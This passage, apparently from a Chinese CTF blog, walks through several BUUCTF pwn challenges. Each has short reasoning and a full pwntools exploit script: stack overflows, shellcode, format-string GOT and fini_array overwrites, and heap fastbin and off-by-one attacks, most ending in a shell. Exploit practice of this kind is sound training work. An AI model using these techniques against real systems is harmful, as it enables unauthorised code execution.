+<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
+<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
+<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
+<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
+<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
+</defs>
+<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
+ <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
+ <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/>
+ <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/>
+<g transform="translate(2233,0)">
+ <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
+ <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
+</g>
+</g>
+</svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="六、bbys-tu-2016"><a href="#六、bbys-tu-2016" class="headerlink" title="六、bbys_tu_2016"></a>六、bbys_tu_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151052237.png"><span class="image-caption">image-20210826151052237</span></p>
+<p>常规checksec一下，32位，开了NX</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151038100.png"><span class="image-caption">image-20210826151038100</span></p>
+<p>进入IDA，发现有个后门函数，并且主函数十分简单，就给了个很明显的溢出，那就直接跳转到后门函数即可</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826150923013.png"><span class="image-caption">image-20210826150923013</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151009378.png"><span class="image-caption">image-20210826151009378</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151024405.png"><span class="image-caption">image-20210826151024405</span></p>
+<p>这边就是IDA里面的溢出不对，所以要去gdb里面动态调试计算偏移才行</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151210436.png"><span class="image-caption">image-20210826151210436</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="七、pwnable-start"><a href="#七、pwnable-start" class="headerlink" title="七、pwnable_start"></a>七、pwnable_start</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151445256.png"><span class="image-caption">image-20210826151445256</span></p>
+<p>常规checksec，32位，什么保护都没开</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151616994.png"><span class="image-caption">image-20210826151616994</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151627593.png"><span class="image-caption">image-20210826151627593</span></p>
+<p>进入IDA，只存在start，并没有main函数，只能看汇编</p>
+<p>通过直接看汇编，或者进行gdb调试，都能获得输入点距离返回地址长度为0x14</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826165108914.png"><span class="image-caption">image-20210826165108914</span></p>
+<p>在gdb里面可以发现，当执行到ret，esp指向的地方存着一个栈上的地址，所以可以据此，我们先跳转到wirte函数，把esp指向的地方输出出来，从而获得栈上地址。</p>
+<p>然后，因为跳转程序，同样会再次执行read，此时我们输入的栈地址比我们泄露的栈地址刚好少4个字节，因为最后都会执行到add esp,0x14，所以偏移仍然是0x14，再解释下为什么esp距离我们写入的/bin/sh\x00会差0x18，是因为执行ret时，会执行pop，所以会多4个字节</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826173800838.png"><span class="image-caption">image-20210826173800838</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="八、picoctf-2018-echo-back"><a href="#八、picoctf-2018-echo-back" class="headerlink" title="八、picoctf_2018_echo_back"></a>八、picoctf_2018_echo_back</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182247503.png"><span class="image-caption">image-20210826182247503</span></p>
+<p>常规checksec一下，32位，开了NX、Canary</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182506261.png"><span class="image-caption">image-20210826182506261</span></p>
+<p>进入IDA，很明显的格式化字符串，跟这篇文章的第五题比较相似。但是少了循环，多了system函数调用，所以我们在劫持got表时需要让程序能再执行一次vuln函数，让我们能输入/bin/sh\x00，不需要泄露libc基址</p>
+<p>因为后面有执行puts函数，那可以把puts的got表修改为vuln函数的起始地址</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826191303201.png"><span class="image-caption">image-20210826191303201</span></p>
+<p>偏移是7</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826184836372.png"><span class="image-caption">image-20210826184836372</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="九、ciscn-2019-sw-1"><a href="#九、ciscn-2019-sw-1" class="headerlink" title="九、ciscn_2019_sw_1"></a>九、ciscn_2019_sw_1</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194736365.png"><span class="image-caption">image-20210826194736365</span></p>
+<p>常规checksec，32位，开了NX</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194146179.png"><span class="image-caption">image-20210826194146179</span></p>
+<p>进入IDA，这题也是一道格式化字符串，而且仔细看，跟第八题几乎一样，并且也是存在调用了system函数，不需要泄露</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826195039322.png"><span class="image-caption">image-20210826195039322</span></p>
+<p>偏移为4</p>
+<p>这边因为printf后续也没别的函数，所以要让程序再执行一次就要去找在printf之后，程序还调用了什么东西，然后去把这个修改为main函数地址</p>
+<p>linux中在程序结束的时候，依次调用<code>fini.array</code>中的每一个函数指针。所以这边把fini.array中的函数指针改写为main函数地址</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8534</span>-<span class="hljs-number">0x83D0</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="十、cmcc-pwnme2"><a href="#十、cmcc-pwnme2" class="headerlink" title="十、cmcc_pwnme2"></a>十、cmcc_pwnme2</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143550209.png"><span class="image-caption">image-20210827143550209</span></p>
+<p>常规checksec，32位，开启NX</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145058312.png"><span class="image-caption">image-20210827145058312</span></p>
+<p>进入IDA，程序存在明显溢出，然后存在这个后门函数可以打印flag，也就是我们只需要让string里面放着的是flag即可跳转到这获得flag。</p>
+<p>所以先溢出到返回地址，在返回地址填上输入函数gets，往string里面写入flag</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827145907550.png"><span class="image-caption">image-20210827145907550</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26117</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./pwnme2&#x27;</span>)<br>string = <span class="hljs-number">0x0804A060</span><br>gets = elf.plt[<span class="hljs-string">&#x27;gets&#x27;</span>]<br><br><br><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p32(gets) + p32(<span class="hljs-number">0x080485CB</span>) + p32(string)<br>p.recvuntil(<span class="hljs-string">&quot;input:&quot;</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;./flag&quot;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="十一、hitcontraining-magicheap"><a href="#十一、hitcontraining-magicheap" class="headerlink" title="十一、hitcontraining_magicheap"></a>十一、hitcontraining_magicheap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153019146.png"><span class="image-caption">image-20210827153019146</span></p>
+<p>常规checksec，64位，根据题目是道堆题，开了NX、Canary</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827153850520.png"><span class="image-caption">image-20210827153850520</span></p>
+<p>进入IDA，发现给了个后门函数，好东西</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155315034.png"><span class="image-caption">image-20210827155315034</span></p>
+<p>这边如果magic &gt;4869就可以执行到后门函数</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827155753245.png"><span class="image-caption">image-20210827155753245</span></p>
+<p>漏洞点可以说是十分明显了，这边edit函数里面输入的长度都没有检查的</p>
+<p>思路：通过堆溢出，覆盖后面堆块，把堆块申请到magic前面，把magic的值修改成大于4869</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827161445791.png"><span class="image-caption">image-20210827161445791</span></p>
+<p>成功getshell</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./magicheap&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29052</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>shell = <span class="hljs-number">0x0000000000400C50</span><br>magic = <span class="hljs-number">0x00000000006020A0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;cccc&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x70</span>) + p64(magic-<span class="hljs-number">0x20</span>+<span class="hljs-number">0xd</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br><span class="hljs-comment">#debug()</span><br>add(<span class="hljs-number">0x60</span>,p64(<span class="hljs-number">4870</span>))<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">4870</span>))<br><br>p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4869&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="十二、hitcontraining-heapcreator"><a href="#十二、hitcontraining-heapcreator" class="headerlink" title="十二、hitcontraining_heapcreator"></a>十二、hitcontraining_heapcreator</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210829092850758.png"><span class="image-caption">image-20210829092850758</span></p>
+<p>常规checksec，开了NX、Cannary</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829094339915.png"><span class="image-caption">image-20210829094339915</span></p>
+<p>进入IDA，阅读完代码后，在edit函数中，存在明显的溢出一个字节的漏洞（offbyone）</p>
+<p>因为有offbyone漏洞在，那肯定是朝着去修改堆头的大小去的，最终达成overlap</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104050093.png"><span class="image-caption">image-20210829104050093</span></p>
+<p>先申请出这些堆块，其中第一个是要申请0x18的，因为这样才能覆盖到下一个堆块的size位。然后因为RELRO和PIE的缘故，我选择劫持got表的方法，所以第四个堆块内容就是写着/bin/sh\x00的。当然，也可以把/bin/sh\x00写到第0个堆块上</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829104713815.png"><span class="image-caption">image-20210829104713815</span></p>
+<p>此时只要再把这个释放了，然后再申请同样大小的堆块回来，那么我们就可以操控其中本来是第二堆块的内容</p>
+<p>然后把可以操控的堆结构内容修改为free的got表地址，从而可以利用show函数打印出libc地址。最后再写入sys即可getshell</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210829110519523.png"><span class="image-caption">image-20210829110519523</span></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./heapcreator&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.23.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26372</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>) <br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x81&#x27;</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(<span class="hljs-number">0x8</span>) + p64(free_got))<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Content : &quot;</span>)<br>free = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-built_in">hex</span>(free))<br>libc=LibcSearcher(<span class="hljs-string">&quot;free&quot;</span>,free)<br>sys=libc.dump(<span class="hljs-string">&quot;system&quot;</span>)+free-libc.dump(<span class="hljs-string">&quot;free&quot;</span>)<br>edit(<span class="hljs-number">2</span>,p64(sys))<br>free(<span class="hljs-number">3</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="十三、sctf-2019-one-heap"><a href="#十三、sctf-2019-one-heap" class="headerlink" title="十三、sctf_2019_one_heap"></a>十三、sctf_2019_one_heap</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210830160009616.png"><span class="image-caption">image-20210830160009616</span></p>
+<p>checksec一下，64位，保护全开</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163315917.png"><span class="image-caption">image-20210830163315917</span></p>
+<p>进入IDA，堆的菜单只有两种功能，申请和释放</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163404930.png"><span class="image-caption">image-20210830163404930</span></p>
+<p>申请的堆块不能大于0x7f，并且申请和释放都有次数限制（其中能申请0xf次，释放4次）。而且，堆块我们只能访问到当前申请出的堆块</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830163542538.png"><span class="image-caption">image-20210830163542538</span></p>
+<p>释放堆块时，指针没有置0</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830185924091.png"><span class="image-caption">image-20210830185924091</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830200649131-1630325227529.png"><span class="image-caption">image-20210830200649131</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830201741615.png"><span class="image-caption">image-20210830201741615</span></p>
+<p>连续释放两次大小为0x70的堆块，进入到tcache bin 中，然后根据一个字节未知进行爆破，使得堆块分配tcache_perthread_struct（就是开头0x250的那个堆块）上</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830203528418.png"><span class="image-caption">image-20210830203528418</span></p>
+<p>把数值改为7，然后再把这个堆块释放，将会进入到unsorted bin中</p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210232915.png"><span class="image-caption">image-20210830210232915</span></p>
+<p><img src="/2021/08/12/2021-08-12-buu07/image-20210830210216419.png"><span class="image-caption">image-20210830210216419</span></p>
+<p>fd，bk已经指向了libc中某个地址了，所以后面还是爆破一个字节，去让stdout吐出libc地址。然后因为tcache结构被改动很大，要先修复一下</p>
